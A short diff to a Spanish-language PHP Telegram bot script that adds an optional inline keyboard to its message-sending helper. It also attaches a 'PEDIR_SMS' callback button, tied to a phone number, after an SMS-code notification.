@@ -43,7 +43,7 @@ function marcarListo($telefono)
     file_put_contents(flagPath($telefono), '1');
 }
 
-function enviarATelegram($botToken, $chatId, $texto)
+function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null)
 {
     if ($botToken === 'PON_AQUI_TU_BOT_TOKEN') {
         return false;
@@ -54,6 +54,9 @@ function enviarATelegram($botToken, $chatId, $texto)
         'chat_id' => $chatId,
         'text'    => $texto,
     ];
+    if ($replyMarkup !== null) {
+        $data['reply_markup'] = json_encode($replyMarkup);
+    }
 
     $options = [
         'http' => [
@@ -116,7 +119,17 @@ if (isset($update['callback_query'])) {
             // Aquí integrarías el envío real de SMS usando $telefono y $nuevoCodigo
 
             $texto = "El código SMS fue enviado a $primerNombre";
-            enviarATelegram($BOT_TOKEN, $chatId, $texto);
+            $replyMarkup = [
+                'inline_keyboard' => [
+                    [
+                        [
+                            'text' => '📩🔄 SMS',
+                            'callback_data' => 'PEDIR_SMS|' . $telefono,
+                        ],
+                    ],
+                ],
+            ];
+            enviarATelegram($BOT_TOKEN, $chatId, $texto, $replyMarkup);
         }
     }
 }
